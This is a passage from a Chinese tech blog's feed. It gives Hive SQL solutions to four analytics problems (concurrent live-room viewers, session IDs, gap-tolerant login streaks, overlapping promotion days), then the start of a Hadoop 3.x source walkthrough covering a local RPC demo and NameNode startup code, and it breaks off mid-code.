id="1、同时在线人数问题">1、同时在线人数问题</h2><p>现有各直播间的用户访问记录表（live_events）如下，表中每行数据表达的信息为，一个用户何时进入了一个直播间，又在何时离开了该直播间，现要求统计各直播间最大同时在线人数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> live_events;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> live_events</span><br><span class="line">(</span><br><span class="line">    user_id      <span class="built_in">int</span> <span class="keyword">comment</span> <span class="string">'用户id'</span>,</span><br><span class="line">    live_id      <span class="built_in">int</span> <span class="keyword">comment</span> <span class="string">'直播id'</span>,</span><br><span class="line">    in_datetime  <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'进入直播间时间'</span>,</span><br><span class="line">    out_datetime <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'离开直播间时间'</span></span><br><span class="line">)<span class="keyword">comment</span> <span class="string">'直播间访问记录'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">    live_id,</span><br><span class="line">    <span class="keyword">max</span>(user_count) max_user_count</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">(</span><br><span class="line">    <span class="keyword">select</span></span><br><span class="line">        user_id,</span><br><span class="line">        live_id,</span><br><span class="line">        <span class="keyword">sum</span>(user_change) <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> live_id <span class="keyword">order</span> <span class="keyword">by</span> event_time) user_count</span><br><span class="line">    <span class="keyword">from</span></span><br><span class="line">    (</span><br><span class="line">        <span class="keyword">select</span> user_id,</span><br><span class="line">               live_id,</span><br><span class="line">               in_datetime event_time,</span><br><span class="line">               <span class="number">1</span> user_change</span><br><span class="line">        <span class="keyword">from</span> live_events</span><br><span class="line">        <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line">        <span class="keyword">select</span> user_id,</span><br><span class="line">               live_id,</span><br><span class="line">               out_datetime,</span><br><span class="line">               <span class="number">-1</span></span><br><span class="line">        <span class="keyword">from</span> live_events</span><br><span class="line">    )t1</span><br><span class="line">)t2</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> live_id;</span><br></pre></td></tr></table></figure><h2 id="2、会话划分问题">2、会话划分问题</h2><p>现有页面浏览记录表（page_view_events），表中有每个用户的每次页面访问记录，规定若同一用户的相邻两次访问记录时间间隔小于60s，则认为两次浏览记录属于同一会话。现有如下需求，为属于同一会话的访问记录增加一个相同的会话id字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> page_view_events;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> page_view_events</span><br><span class="line">(</span><br><span class="line">    user_id        <span class="built_in">int</span> <span class="keyword">comment</span> <span class="string">'用户id'</span>,</span><br><span class="line">    page_id        <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'页面id'</span>,</span><br><span class="line">    view_timestamp <span class="built_in">bigint</span> <span class="keyword">comment</span> <span class="string">'访问时间戳'</span></span><br><span class="line">)<span class="keyword">comment</span> <span class="string">'页面访问记录'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> user_id,</span><br><span class="line">       page_id,</span><br><span class="line">       view_timestamp,</span><br><span class="line">       <span class="keyword">concat</span>(user_id, <span class="string">'-'</span>, <span class="keyword">sum</span>(session_start_point) <span class="keyword">over</span> (<span class="keyword">partition</span> <span class="keyword">by</span> user_id <span class="keyword">order</span> <span class="keyword">by</span> view_timestamp)) session_id</span><br><span class="line"><span class="keyword">from</span> (</span><br><span class="line">         <span class="keyword">select</span> user_id,</span><br><span class="line">                page_id,</span><br><span class="line">                view_timestamp,</span><br><span class="line">                <span class="keyword">if</span>(view_timestamp - lagts &gt;= <span class="number">60</span>, <span class="number">1</span>, <span class="number">0</span>) session_start_point</span><br><span class="line">         <span class="keyword">from</span> (</span><br><span class="line">                  <span class="keyword">select</span> user_id,</span><br><span class="line">                         page_id,</span><br><span class="line">                         view_timestamp,</span><br><span class="line">                         lag(view_timestamp, <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">over</span> (<span class="keyword">partition</span> <span class="keyword">by</span> user_id <span class="keyword">order</span> <span class="keyword">by</span> view_timestamp) lagts</span><br><span class="line">                  <span class="keyword">from</span> page_view_events</span><br><span class="line">              ) t1</span><br><span class="line">     ) t2;</span><br></pre></td></tr></table></figure><h2 id="3、间断连续登录用户问题">3、间断连续登录用户问题</h2><p>现有各用户的登录记录表（login_events），表中每行数据表达的信息是一个用户何时登录了平台，现要求统计各用户最长的连续登录天数，间断一天也算作连续，例如：一个用户在1,3,5,6登录，则视为连续6天登录。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> login_events;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">exists</span> login_events</span><br><span class="line">(</span><br><span class="line">    user_id        <span class="built_in">int</span> <span class="keyword">comment</span> <span class="string">'用户id'</span>,</span><br><span class="line">    login_datetime <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'登录时间'</span></span><br><span class="line">)<span class="keyword">comment</span> <span class="string">'直播间访问记录'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">    user_id,</span><br><span class="line">    <span class="keyword">max</span>(recent_days) max_recent_days  <span class="comment">--求出每个用户最大的连续天数</span></span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">(</span><br><span class="line">    <span class="keyword">select</span></span><br><span class="line">        user_id,</span><br><span class="line">        user_flag,</span><br><span class="line">        <span class="keyword">datediff</span>(<span class="keyword">max</span>(login_date),<span class="keyword">min</span>(login_date)) + <span class="number">1</span> recent_days <span class="comment">--按照分组求每个用户每次连续的天数(记得加1)</span></span><br><span class="line">    <span class="keyword">from</span></span><br><span class="line">    (</span><br><span class="line">        <span class="keyword">select</span></span><br><span class="line">            user_id,</span><br><span class="line">            login_date,</span><br><span class="line">            lag1_date,</span><br><span class="line">            <span class="keyword">concat</span>(user_id,<span class="string">'_'</span>,flag) user_flag <span class="comment">--拼接用户和标签分组</span></span><br><span class="line">        <span class="keyword">from</span></span><br><span class="line">        (</span><br><span class="line">            <span class="keyword">select</span></span><br><span class="line">                user_id,</span><br><span class="line">                login_date,</span><br><span class="line">                lag1_date,</span><br><span class="line">                <span class="keyword">sum</span>(<span class="keyword">if</span>(<span class="keyword">datediff</span>(login_date,lag1_date)&gt;<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)) <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> user_id <span class="keyword">order</span> <span class="keyword">by</span> login_date) flag  <span class="comment">--获取大于2的标签</span></span><br><span class="line">            <span class="keyword">from</span></span><br><span class="line">            (</span><br><span class="line">                <span class="keyword">select</span></span><br><span class="line">                    user_id,</span><br><span class="line">                    login_date,</span><br><span class="line">                    lag(login_date,<span class="number">1</span>,<span class="string">'1970-01-01'</span>) <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> user_id <span class="keyword">order</span> <span class="keyword">by</span> login_date) lag1_date  <span class="comment">--获取上一次登录日期</span></span><br><span class="line">                <span class="keyword">from</span></span><br><span class="line">                (</span><br><span class="line">                    <span class="keyword">select</span></span><br><span class="line">                        user_id,</span><br><span class="line">                        <span class="keyword">date_format</span>(login_datetime,<span class="string">'yyyy-MM-dd'</span>) login_date</span><br><span class="line">                    <span class="keyword">from</span> login_events</span><br><span class="line">                    <span class="keyword">group</span> <span class="keyword">by</span> user_id,<span class="keyword">date_format</span>(login_datetime,<span class="string">'yyyy-MM-dd'</span>)  <span class="comment">--按照用户和日期去重</span></span><br><span class="line">                )t1</span><br><span class="line">            )t2</span><br><span class="line">        )t3</span><br><span class="line">    )t4</span><br><span class="line">    <span class="keyword">group</span> <span class="keyword">by</span> user_id,user_flag</span><br><span class="line">)t5</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> user_id;</span><br></pre></td></tr></table></figure><h2 id="4、日期交叉问题">4、日期交叉问题</h2><p>现有各品牌优惠周期表（promotion_info），其记录了每个品牌的每个优惠活动的周期，其中同一品牌的不同优惠活动的周期可能会有交叉，现要求统计每个品牌的优惠总天数，若某个品牌在同一天有多个优惠活动，则只按一天计算</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> promotion_info;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> promotion_info</span><br><span class="line">(</span><br><span class="line">    promotion_id <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'优惠活动id'</span>,</span><br><span class="line">    brand        <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'优惠品牌'</span>,</span><br><span class="line">    start_date   <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'优惠活动开始日期'</span>,</span><br><span class="line">    end_date     <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'优惠活动结束日期'</span></span><br><span class="line">) <span class="keyword">comment</span> <span class="string">'各品牌活动周期表'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">    brand,</span><br><span class="line">    <span class="keyword">sum</span>(<span class="keyword">datediff</span>(end_date,start_date)+<span class="number">1</span>) promotion_day_count</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">(</span><br><span class="line">    <span class="keyword">select</span></span><br><span class="line">        brand,</span><br><span class="line">        max_end_date,</span><br><span class="line">        <span class="keyword">if</span>(max_end_date <span class="keyword">is</span> <span class="literal">null</span> <span class="keyword">or</span> start_date&gt;max_end_date,start_date,<span class="keyword">date_add</span>(max_end_date,<span class="number">1</span>)) start_date,</span><br><span class="line">        end_date</span><br><span class="line">    <span class="keyword">from</span></span><br><span class="line">    (</span><br><span class="line">        <span class="keyword">select</span></span><br><span class="line">            brand,</span><br><span class="line">            start_date,</span><br><span class="line">            end_date,</span><br><span class="line">            <span class="keyword">max</span>(end_date) <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> brand <span class="keyword">order</span> <span class="keyword">by</span> start_date <span class="keyword">rows</span> <span class="keyword">between</span> <span class="keyword">unbounded</span> <span class="keyword">preceding</span> <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">preceding</span>) max_end_date</span><br><span class="line">        <span class="keyword">from</span> promotion_info</span><br><span class="line">    )t1</span><br><span class="line">)t2</span><br><span class="line"><span class="keyword">where</span> end_date&gt;start_date</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> brand;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、Hive入门与安装&lt;/h1&gt;
&lt;h2 id=&quot;1、Hive入门&quot;&gt;1、Hive入门&lt;/h2&gt;
&lt;h3 id=&quot;1-1-简介&quot;&gt;1.1 简介&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Hive是由Facebook开源，基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张表，并提供类SQL查询功能&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Hive是一个Hadoop客户端，用于将HQL（Hive SQL）转化成MapReduce程序&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Hive中每张表的数据存储在HDFS&lt;/li&gt;
&lt;li&gt;Hive分析数据底层的实现是MapReduce（也可配置为Spark或者Tez） &lt;/li&gt;
&lt;li&gt;执行程序运行在Yarn上&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Hadoop3.x源码解析</title>
    <link href="https://blog.shawncoding.top/posts/ccc73924.html"/>
    <id>https://blog.shawncoding.top/posts/ccc73924.html</id>
    <published>2024-02-06T07:03:53.000Z</published>
    <updated>2024-02-29T12:00:08.275Z</updated>
    
    <content type="html"><![CDATA[<h1>Hadoop3.x源码解析</h1><h1>一、RPC通信原理解析</h1><p><img src="http://qnypic.shawncoding.top/blog/202401251335067.png" alt></p><a id="more"></a><h2 id="1、概要">1、概要</h2><p>模拟RPC的客户端、服务端、通信协议三者如何工作的</p><p><img src="http://qnypic.shawncoding.top/blog/202401251335068.png" alt></p><h2 id="2、代码demo">2、代码demo</h2><p>在HDFSClient项目基础上创建包名com.atguigu.rpc，创建RPC协议</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RPCProtocol</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> versionID = <span class="number">666</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">mkdirs</span><span class="params">(String path)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建RPC服务端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NNServer</span> <span class="keyword">implements</span> <span class="title">RPCProtocol</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mkdirs</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"服务端，创建路径"</span> + path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Server server = <span class="keyword">new</span> RPC.Builder(<span class="keyword">new</span> Configuration())</span><br><span class="line">                .setBindAddress(<span class="string">"localhost"</span>)</span><br><span class="line">                .setPort(<span class="number">8888</span>)</span><br><span class="line">                .setProtocol(RPCProtocol<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">                .<span class="title">setInstance</span>(<span class="title">new</span> <span class="title">NNServer</span>())</span></span><br><span class="line"><span class="class">                .<span class="title">build</span>()</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"服务器开始工作"</span>);</span><br><span class="line"></span><br><span class="line">        server.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建RPC客户端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HDFSClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        RPCProtocol client = RPC.getProxy(</span><br><span class="line">                RPCProtocol<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">                <span class="title">RPCProtocol</span>.<span class="title">versionID</span>,</span></span><br><span class="line">                new InetSocketAddress("localhost", 8888),</span><br><span class="line">                <span class="keyword">new</span> Configuration());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"我是客户端"</span>);</span><br><span class="line"></span><br><span class="line">        client.mkdirs(<span class="string">"/input"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试，启动服务端，观察控制台打印：服务器开始工作，在控制台Terminal窗口输入，jps，查看到NNServer服务</p><p>启动客户端，观察客户端控制台打印：我是客户端，观察服务端控制台打印：服务端，创建路径/input</p><h1>二、NameNode启动源码解析</h1><h2 id="1、概述">1、概述</h2><p><img src="http://qnypic.shawncoding.top/blog/202401251335069.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202401251335070.png" alt></p><p>然后首先需要环境准备，导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-hdfs<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-hdfs-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ctrl+h或者双击shift全局查找namenode，进入NameNode.java，然后ctrl + f，查找main方法，点击<code>createNameNode</code>，点击最后default返回的<code>NameNode</code>，点击<code>initialize</code>初始化，核心方法就在里面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">(Configuration conf)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (NamenodeRole.NAMENODE == role) &#123;</span><br><span class="line">  <span class="comment">// 启动HTTP服务端（9870）</span></span><br><span class="line">    startHttpServer(conf);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 加载镜像文件和编辑日志到内存</span></span><br><span class="line">  loadNamesystem(conf);</span><br><span class="line">  startAliasMapServerIfNecessary(conf);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建NN的RPC服务端</span></span><br><span class="line">  rpcServer = createRpcServer(conf);</span><br><span class="line"></span><br><span class="line">  initReconfigurableBackoffKey();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (clientNamenodeAddress == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">// This is expected for MiniDFSCluster. Set it now using </span></span><br><span class="line">    <span class="comment">// the RPC server's bind address.</span></span><br><span class="line">    clientNamenodeAddress = </span><br><span class="line">        NetUtils.getHostPortString(getNameNodeAddress());</span><br><span class="line">    LOG.info(<span class="string">"Clients are to use "</span> + clientNamenodeAddress + <span class="string">" to access"</span></span><br><span class="line">        + <span class="string">" this namenode/service."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (NamenodeRole.NAMENODE == role) &#123;</span><br><span class="line">    httpServer.setNameNodeAddress(getNameNodeAddress());</span><br><span class="line">    httpServer.setFSImage(getFSImage());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// NN启动资源检查</span></span><br><span class="line">  startCommonServices(conf);</span><br><span class="line">  startMetricsLogger(conf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2、启动9870端口服务">2、启动9870端口服务</h2><p>点击startHttpServer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startHttpServer</span><span class="params">(<span class="keyword">final</span> Configuration conf)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  httpServer = <span class="keyword">new</span> NameNodeHttpServer(conf, <span class="keyword">this</span>, getHttpServerBindAddress(conf));</span><br><span class="line">  httpServer.start();</span><br><span class="line">  httpServer.setStartupProgress(startupProgress);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> InetSocketAddress <span class="title">getHttpServerBindAddress</span><span class="params">(Configuration conf)</span> </span>&#123;</span><br><span class="line">  InetSocketAddress bindAddress = getHttpServerAddress(conf);</span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">return</span> bindAddress;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> InetSocketAddress <span class="title">getHttpServerAddress</span><span class="params">(Configuration conf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> getHttpAddress(conf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetSocketAddress <span class="title">getHttpAddress</span><span class="params">(Configuration conf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span>  NetUtils.createSocketAddr(</span><br><span class="line">      conf.getTrimmed(DFS_NAMENODE_HTTP_ADDRESS_KEY, DFS_NAMENODE_HTTP_ADDRESS_DEFAULT));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String  DFS_NAMENODE_HTTP_ADDRESS_DEFAULT = <span class="string">"0.0.0.0:"</span> + DFS_NAMENODE_HTTP_PORT_DEFAULT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span>     DFS_NAMENODE_HTTP_PORT_DEFAULT =</span><br><span class="line">HdfsClientConfigKeys.DFS_NAMENODE_HTTP_PORT_DEFAULT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>  DFS_NAMENODE_HTTP_PORT_DEFAULT = <span class="number">9870</span>;</span><br></pre></td></tr></table></figure><p>点击startHttpServer方法中的httpServer.<strong>start</strong>();</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 